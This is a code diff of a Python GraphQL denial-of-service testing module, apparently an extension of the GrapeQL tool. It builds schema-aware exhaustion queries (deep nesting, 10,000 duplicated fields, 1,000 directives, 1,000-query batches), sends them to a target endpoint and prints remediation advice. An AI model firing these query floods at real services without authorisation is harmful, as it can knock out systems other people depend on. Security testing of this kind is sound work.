@@ -1,39 +1,175 @@
-#!/usr/bin/env python3
 """
-GraphQL DoS Vulnerability Scanner
-Tests for common GraphQL DoS vectors including:
-- Nested query attacks
-- Circular fragment attacks
-- Field duplication attacks
-- Resource exhaustion via aliases
+Author: Extension of Aleksa Zatezalo's GrapeQL
+Version: 1.1
+Date: February 2025
+Description: GraphQL DoS testing module with schema-aware query generation
 """
 
 import asyncio
 import aiohttp
-import argparse
-from typing import Dict, Optional
-from datetime import datetime
+from typing import Dict, List, Optional, Tuple, Any
+from grapePrint import grapePrint
+import time
 
-class GraphQLDoSChecker:
-    def __init__(self, url: str, max_depth: int = 10, max_aliases: int = 1000):
-        self.url = url
-        self.max_depth = max_depth
-        self.max_aliases = max_aliases
-        self.schema = None
-        self.query_type = None
-        
-    async def fetch_schema(self) -> Optional[Dict]:
-        """Fetch the GraphQL schema using introspection"""
-        introspection_query = """
+class root():
+    """
+    A class for testing GraphQL endpoints for various Denial of Service vulnerabilities.
+    Generates targeted queries based on introspection of the actual schema.
+    """
+    
+    def __init__(self):
+        """Initialize the DoS tester with default settings and printer."""
+        self.message = grapePrint()
+        self.proxy_url: Optional[str] = None
+        self.schema: Optional[Dict] = None
+        self.endpoint: Optional[str] = None
+        self.query_type: Optional[str] = None
+        self.types: Dict[str, Dict] = {}
+    
+
+    def print_vulnerability_details(self, vuln_type: str, is_vulnerable: bool, duration: float):
+        """Print detailed information about the vulnerability test results."""
+        if is_vulnerable:
+            self.message.printMsg(f"Endpoint is VULNERABLE to {vuln_type}!", status="warning")
+            self.message.printMsg(f"Response time: {duration:.2f} seconds", status="warning")
+            
+            # Print specific remediation advice based on vulnerability type
+            print("\nRemediation Advice:")
+            match vuln_type:
+                case "Circular Query DoS":
+                    print("""
+    1. Implement query depth limiting
+    2. Set maximum recursion depth
+    3. Use query cost analysis
+    4. Consider implementing persisted queries
+    5. Monitor and rate limit by client IP
+    
+    Example configuration (for Apollo Server):
+    ```
+    const server = new ApolloServer({
+      schema,
+      validationRules: [
+        depthLimit(5),
+        costAnalysis({
+          maximumCost: 1000,
+        }),
+      ],
+    });
+    ```
+                    """)
+                    
+                case "Field Duplication DoS":
+                    print("""
+    1. Implement field count limiting
+    2. Use query cost analysis
+    3. Cache frequently requested fields
+    4. Set maximum query complexity
+    5. Consider implementing automatic field merging
+    
+    Example configuration:
+    ```
+    const server = new ApolloServer({
+      schema,
+      validationRules: [
+        QueryComplexity({
+          maximumComplexity: 1000,
+          variables: {},
+          onComplete: (complexity) => {
+            console.log('Query Complexity:', complexity);
+          },
+        }),
+      ],
+    });
+    ```
+                    """)
+                    
+                case "Directive Overload DoS":
+                    print("""
+    1. Limit number of directives per query
+    2. Implement directive-specific rate limiting
+    3. Cache directive resolution results
+    4. Set maximum directive depth
+    5. Monitor directive usage patterns
+    
+    Example implementation:
+    ```
+    const directiveLimit = (maxDirectives) => ({
+      Field: (node) => {
+        const directiveCount = node.directives.length;
+        if (directiveCount > maxDirectives) {
+          throw new Error(`Query has too many directives: ${directiveCount}`);
+        }
+        return node;
+      },
+    });
+    ```
+                    """)
+                    
+                case "Object Override DoS":
+                    print("""
+    1. Implement object nesting limits
+    2. Set maximum response size
+    3. Use pagination for large objects
+    4. Monitor memory usage
+    5. Implement response caching
+    
+    Example configuration:
+    ```
+    const schema = makeExecutableSchema({
+      typeDefs,
+      resolvers,
+      validationRules: [
+        MaxObjectNestingRule(5),
+        MaxResponseSizeRule(1000000),
+      ],
+    });
+    ```
+                    """)
+                    
+                case "Array Batching DoS":
+                    print("""
+    1. Implement batch size limits
+    2. Set maximum concurrent queries
+    3. Use query cost analysis for batches
+    4. Implement request queuing
+    5. Monitor batch processing times
+    
+    Example configuration:
+    ```
+    const server = new ApolloServer({
+      schema,
+      validationRules: [
+        BatchLimitRule(100),
+        ConcurrentQueryLimit(10),
+      ],
+    });
+    ```
+                    """)
+        else:
+            self.message.printMsg(f"Endpoint is NOT vulnerable to {vuln_type}", status="success")
+            self.message.printMsg(f"Response time: {duration:.2f} seconds", status="success")
+
+    def configure_proxy(self, proxy_host: str, proxy_port: int):
+        """Configure HTTP proxy settings."""
+        self.proxy_url = f"http://{proxy_host}:{proxy_port}"
+
+    async def run_introspection(self, session: aiohttp.ClientSession) -> bool:
+        """
+        Run introspection query to get schema information.
+        """
+        query = """
         query IntrospectionQuery {
           __schema {
-            queryType { name }
+            queryType {
+              name
+            }
             types {
               name
               fields {
                 name
                 type {
                   name
+                  kind
                   ofType {
                     name
                     kind
@@ -44,187 +180,351 @@ class GraphQLDoSChecker:
           }
         }
         """
-        
-        print("[*] Fetching GraphQL schema...")
+
         try:
-            async with aiohttp.ClientSession() as session:
-                async with session.post(
-                    self.url,
-                    json={'query': introspection_query},
-                    headers={'Content-Type': 'application/json'}
-                ) as response:
-                    if response.status == 200:
-                        result = await response.json()
-                        if 'data' in result:
-                            self.schema = result['data']['__schema']
-                            self.query_type = self.schema['queryType']['name']
-                            print("[+] Schema fetched successfully")
-                            return self.schema
-                    print(f"[!] Failed to fetch schema: {response.status}")
-                    return None
-        except Exception as e:
-            print(f"[!] Error fetching schema: {str(e)}")
-            return None
-
-    def generate_nested_query(self, depth: int) -> str:
-        """Generate a deeply nested query for testing"""
-        if not self.schema:
-            return ""
-        
-        # Find a field that returns an object type for nesting
-        nestable_field = None
-        for type_info in self.schema['types']:
-            if type_info['name'] == self.query_type:
-                for field in type_info['fields']:
-                    if field['type'].get('ofType', {}).get('kind') == 'OBJECT':
-                        nestable_field = field['name']
-                        break
-                break
-        
-        if not nestable_field:
-            return ""
-        
-        # Generate nested query
-        query = f"query NestedQuery {{ {nestable_field} {{\n"
-        current_depth = 0
-        while current_depth < depth:
-            query += "  " * (current_depth + 1) + f"{nestable_field} {{\n"
-            current_depth += 1
-        query += "  " * (depth + 1) + "id\n"  # Add a terminal field
-        query += "}" * (depth + 1)
-        query += "}"
-        
-        return query
-
-    def generate_circular_fragment(self) -> str:
-        """Generate a query with circular fragments"""
-        return """
-        query CircularQuery {
-            ...FragmentA
-        }
-        fragment FragmentA on Query {
-            ...FragmentB
-        }
-        fragment FragmentB on Query {
-            ...FragmentC
-        }
-        fragment FragmentC on Query {
-            ...FragmentA
-        }
-        """
-
-    def generate_field_duplication(self, num_duplicates: int) -> str:
-        """Generate a query with duplicated fields"""
-        if not self.schema:
-            return ""
-            
-        # Find a simple scalar field to duplicate
-        scalar_field = None
-        for type_info in self.schema['types']:
-            if type_info['name'] == self.query_type:
-                for field in type_info['fields']:
-                    if not field['type'].get('ofType'):  # Simple scalar field
-                        scalar_field = field['name']
-                        break
-                break
-                
-        if not scalar_field:
-            return ""
-            
-        query = "query DuplicateQuery {\n"
-        for i in range(num_duplicates):
-            query += f"  field_{i}: {scalar_field}\n"
-        query += "}"
-        
-        return query
-
-    async def test_query(self, name: str, query: str) -> bool:
-        """Test a query and measure response time"""
-        print(f"\n[*] Testing {name}...")
-        start_time = datetime.now()
-        
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.post(
-                    self.url,
-                    json={'query': query},
-                    headers={'Content-Type': 'application/json'},
-                    timeout=10
-                ) as response:
-                    duration = (datetime.now() - start_time).total_seconds()
-                    status = response.status
-                    try:
-                        result = await response.json()
-                    except:
-                        result = await response.text()
-                    
-                    print(f"[+] Response time: {duration:.2f}s")
-                    print(f"[+] Status code: {status}")
-                    
-                    # Analyze response for potential vulnerabilities
-                    if status == 200 and duration > 5:
-                        print(f"[!] Potential DoS vulnerability: High response time")
+            async with session.post(
+                self.endpoint,
+                json={'query': query},
+                headers={'Content-Type': 'application/json'},
+                timeout=aiohttp.ClientTimeout(total=10),
+                proxy=self.proxy_url,
+                ssl=False
+            ) as response:
+                if response.status == 200:
+                    result = await response.json()
+                    if result.get('data'):
+                        self.schema = result['data']['__schema']
+                        self.query_type = self.schema['queryType']['name']
+                        
+                        # Process types into a more usable format
+                        for type_info in self.schema['types']:
+                            if type_info.get('fields'):
+                                self.types[type_info['name']] = {
+                                    'fields': type_info['fields']
+                                }
+                        
+                        self.message.printMsg("Successfully retrieved schema", status="success")
                         return True
-                    elif status == 500:
-                        print(f"[!] Potential DoS vulnerability: Server error")
-                        return True
-                    return False
                     
-        except asyncio.TimeoutError:
-            print(f"[!] Potential DoS vulnerability: Query timed out")
-            return True
+            self.message.printMsg("Failed to parse introspection result", status="failed")
+            return False
+            
         except Exception as e:
-            print(f"[!] Error testing query: {str(e)}")
+            self.message.printMsg(f"Introspection query failed: {str(e)}", status="failed")
             return False
 
-    async def run_tests(self):
-        """Run all DoS vulnerability tests"""
-        if not await self.fetch_schema():
-            print("[!] Failed to fetch schema. Exiting.")
-            return
-            
-        vulnerabilities = []
+    def generate_circular_query(self) -> str:
+        """
+        Generate a circular query based on schema types that reference each other.
+        """
+        if not self.schema:
+            return ""
+
+        # Find a type that has a field referencing another type
+        circular_fields = []
+        for type_name, type_info in self.types.items():
+            for field in type_info.get('fields', []):
+                field_type = field['type'].get('name') or field['type'].get('ofType', {}).get('name')
+                if field_type in self.types:
+                    circular_fields.append((type_name, field['name'], field_type))
+
+        if not circular_fields:
+            return ""
+
+        # Generate nested query using the first circular reference found
+        type_name, field_name, field_type = circular_fields[0]
+        nested_query = f"""
+            {field_name} {{
+                id
+                {field_name} {{
+                    id
+                    {field_name} {{
+                        id
+                        {field_name} {{
+                            id
+                        }}
+                    }}
+                }}
+            }}
+        """
+
+        return f"query {{ {nested_query} }}"
+
+    def generate_field_duplication(self) -> str:
+        """
+        Generate a query with duplicated fields based on schema.
+        """
+        if not self.query_type or not self.types.get(self.query_type):
+            return ""
+
+        # Get all scalar fields from the query type
+        scalar_fields = []
+        for field in self.types[self.query_type]['fields']:
+            field_type = field['type'].get('name')
+            if field_type in ['String', 'Int', 'Float', 'Boolean', 'ID']:
+                scalar_fields.append(field['name'])
+
+        if not scalar_fields:
+            return ""
+
+        # Duplicate the first scalar field many times
+        duplicated_field = f"{scalar_fields[0]}\n" * 10000
+        return f"query {{ {duplicated_field} }}"
+
+    def generate_directive_overload(self) -> str:
+        """
+        Generate a query with excessive directives based on schema.
+        """
+        if not self.query_type or not self.types.get(self.query_type):
+            return ""
+
+        # Get the first field from the query type
+        first_field = next(iter(self.types[self.query_type]['fields']), None)
+        if not first_field:
+            return ""
+
+        # Add many include directives
+        directives = "@include(if: true) " * 1000
+        return f"""
+        query {{
+            {first_field['name']} {directives} {{
+                id
+            }}
+        }}
+        """
+
+    def generate_object_override(self) -> str:
+        """
+        Generate a deeply nested query based on schema types.
+        """
+        if not self.query_type or not self.types.get(self.query_type):
+            return ""
+
+        # Find a field that returns an object type
+        object_fields = []
+        for field in self.types[self.query_type]['fields']:
+            field_type = field['type'].get('name') or field['type'].get('ofType', {}).get('name')
+            if field_type in self.types:
+                object_fields.append(field['name'])
+
+        if not object_fields:
+            return ""
+
+        # Create deeply nested query
+        nested_levels = 100
+        current_query = "id"
+        for _ in range(nested_levels):
+            current_query = f"""
+            {object_fields[0]} {{
+                {current_query}
+            }}
+            """
+
+        return f"query {{ {current_query} }}"
+
+    def generate_array_batching(self) -> List[Dict[str, str]]:
+        """
+        Generate a batch of queries based on schema.
+        """
+        if not self.query_type or not self.types.get(self.query_type):
+            return []
+
+        # Get first available field
+        first_field = next(iter(self.types[self.query_type]['fields']), None)
+        if not first_field:
+            return []
+
+        # Create batch of simple queries
+        return [{
+            "query": f"""
+            query {{
+                {first_field['name']} {{
+                    id
+                }}
+            }}
+            """
+        } for _ in range(1000)]
+
+    async def setEndpoint(self, endpoint: str, proxy_string: Optional[str] = None) -> bool:
+        """
+        Set the endpoint and retrieve its schema through introspection.
         
-        # Test 1: Nested Query Attack
-        nested_query = self.generate_nested_query(self.max_depth)
-        if nested_query and await self.test_query("Nested Query Attack", nested_query):
-            vulnerabilities.append("Nested Query")
+        Args:
+            endpoint: The GraphQL endpoint URL
+            proxy_string: Optional proxy in format "host:port"
             
-        # Test 2: Circular Fragment Attack
-        circular_query = self.generate_circular_fragment()
-        if await self.test_query("Circular Fragment Attack", circular_query):
-            vulnerabilities.append("Circular Fragment")
-            
-        # Test 3: Field Duplication Attack
-        duplication_query = self.generate_field_duplication(self.max_aliases)
-        if duplication_query and await self.test_query("Field Duplication Attack", duplication_query):
-            vulnerabilities.append("Field Duplication")
-            
-        # Summary
-        print("\n=== Vulnerability Scan Summary ===")
-        if vulnerabilities:
-            print("[!] Potential DoS vulnerabilities found:")
-            for vuln in vulnerabilities:
-                print(f"  - {vuln}")
-            print("\nRecommendations:")
-            print("- Implement query depth limiting")
-            print("- Add query complexity analysis")
-            print("- Set timeouts for query execution")
-            print("- Implement rate limiting")
-        else:
-            print("[+] No obvious DoS vulnerabilities detected")
-            print("[*] Note: This does not guarantee the absence of vulnerabilities")
+        Returns:
+            bool: True if endpoint was set and schema retrieved successfully
+        """
+        self.endpoint = endpoint
+        
+        # Configure proxy if provided
+        if proxy_string:
+            try:
+                proxy_host, proxy_port = proxy_string.split(':')
+                self.configure_proxy(proxy_host, int(proxy_port))
+            except ValueError:
+                self.message.printMsg("Invalid proxy format. Expected host:port", status="failed")
+                return False
 
-def main():
-    parser = argparse.ArgumentParser(description='GraphQL DoS Vulnerability Scanner')
-    parser.add_argument('url', help='GraphQL endpoint URL')
-    parser.add_argument('--max-depth', type=int, default=10, help='Maximum query depth for nested attack (default: 10)')
-    parser.add_argument('--max-aliases', type=int, default=1000, help='Maximum number of aliases for duplication attack (default: 1000)')
-    
-    args = parser.parse_args()
-    
-    checker = GraphQLDoSChecker(args.url, args.max_depth, args.max_aliases)
-    asyncio.run(checker.run_tests())
+        # Run introspection
+        async with aiohttp.ClientSession() as session:
+            return await self.run_introspection(session)
 
-if __name__ == "__main__":
-    main()s
+    async def test_circular_query(self, session: aiohttp.ClientSession) -> Tuple[bool, float]:
+        """Test for circular query vulnerability using schema-based query."""
+        query = self.generate_circular_query()
+        if not query:
+            return False, 0.0
+
+        start_time = time.time()
+        try:
+            async with session.post(
+                self.endpoint,
+                json={'query': query},
+                headers={'Content-Type': 'application/json'},
+                timeout=aiohttp.ClientTimeout(total=10),
+                proxy=self.proxy_url,
+                ssl=False
+            ) as response:
+                duration = time.time() - start_time
+                is_vulnerable = duration > 5 or response.status == 500
+                return is_vulnerable, duration
+        except asyncio.TimeoutError:
+            return True, 10.0
+        except Exception:
+            return False, 0.0
+
+    async def test_field_duplication(self, session: aiohttp.ClientSession) -> Tuple[bool, float]:
+        """Test for field duplication vulnerability using schema-based query."""
+        query = self.generate_field_duplication()
+        if not query:
+            return False, 0.0
+
+        start_time = time.time()
+        try:
+            async with session.post(
+                self.endpoint,
+                json={'query': query},
+                headers={'Content-Type': 'application/json'},
+                timeout=aiohttp.ClientTimeout(total=10),
+                proxy=self.proxy_url,
+                ssl=False
+            ) as response:
+                duration = time.time() - start_time
+                is_vulnerable = duration > 5 or response.status == 500
+                return is_vulnerable, duration
+        except asyncio.TimeoutError:
+            return True, 10.0
+        except Exception:
+            return False, 0.0
+
+    async def test_directive_overload(self, session: aiohttp.ClientSession) -> Tuple[bool, float]:
+        """Test for directive overloading vulnerability using schema-based query."""
+        query = self.generate_directive_overload()
+        if not query:
+            return False, 0.0
+
+        start_time = time.time()
+        try:
+            async with session.post(
+                self.endpoint,
+                json={'query': query},
+                headers={'Content-Type': 'application/json'},
+                timeout=aiohttp.ClientTimeout(total=10),
+                proxy=self.proxy_url,
+                ssl=False
+            ) as response:
+                duration = time.time() - start_time
+                is_vulnerable = duration > 5 or response.status == 500
+                return is_vulnerable, duration
+        except asyncio.TimeoutError:
+            return True, 10.0
+        except Exception:
+            return False, 0.0
+
+    async def test_object_override(self, session: aiohttp.ClientSession) -> Tuple[bool, float]:
+        """Test for object override vulnerability using schema-based query."""
+        query = self.generate_object_override()
+        if not query:
+            return False, 0.0
+
+        start_time = time.time()
+        try:
+            async with session.post(
+                self.endpoint,
+                json={'query': query},
+                headers={'Content-Type': 'application/json'},
+                timeout=aiohttp.ClientTimeout(total=10),
+                proxy=self.proxy_url,
+                ssl=False
+            ) as response:
+                duration = time.time() - start_time
+                is_vulnerable = duration > 5 or response.status == 500
+                return is_vulnerable, duration
+        except asyncio.TimeoutError:
+            return True, 10.0
+        except Exception:
+            return False, 0.0
+
+    async def test_array_batching(self, session: aiohttp.ClientSession) -> Tuple[bool, float]:
+        """Test for array batching vulnerability using schema-based query."""
+        queries = self.generate_array_batching()
+        if not queries:
+            return False, 0.0
+
+        start_time = time.time()
+        try:
+            async with session.post(
+                self.endpoint,
+                json=queries,
+                headers={'Content-Type': 'application/json'},
+                timeout=aiohttp.ClientTimeout(total=10),
+                proxy=self.proxy_url,
+                ssl=False
+            ) as response:
+                duration = time.time() - start_time
+                is_vulnerable = duration > 5 or response.status == 500
+                return is_vulnerable, duration
+        except asyncio.TimeoutError:
+            return True, 10.0
+        except Exception:
+            return False, 0.0
+
+    async def test_endpoint_dos(self):
+        """
+        Test the endpoint for all DoS vulnerabilities using schema-based queries.
+        """
+        if not self.endpoint or not self.schema:
+            self.message.printMsg("No endpoint set or schema not retrieved. Run setEndpoint first.", status="failed")
+            return
+
+        self.message.printMsg(f"Testing endpoint: {self.endpoint}", status="log")
+        
+        async with aiohttp.ClientSession() as session:
+            tests = [
+                ("Circular Query DoS", self.test_circular_query),
+                ("Field Duplication DoS", self.test_field_duplication),
+                ("Directive Overload DoS", self.test_directive_overload),
+                ("Object Override DoS", self.test_object_override),
+                ("Array Batching DoS", self.test_array_batching)
+            ]
+            
+            for vuln_type, test_func in tests:
+                self.message.printMsg(f"Testing for {vuln_type}...", status="log")
+                is_vulnerable, duration = await test_func(session)
+                self.print_vulnerability_details(vuln_type, is_vulnerable, duration)
+                await asyncio.sleep(1)  # Pause between tests
+
+# async def main():
+#     dos_tester = grapeDos()
+    
+#     # First set the endpoint and get schema
+#     if await dos_tester.setEndpoint("http://127.0.0.1:5013/graphql", "127.0.0.1:8080"):
+#         # Then run the DOS tests
+#         await dos_tester.test_endpoint_dos()
+#     else:
+#         print("Failed to set endpoint or retrieve schema")
+
+# if __name__ == "__main__":
+#     asyncio.run(main())
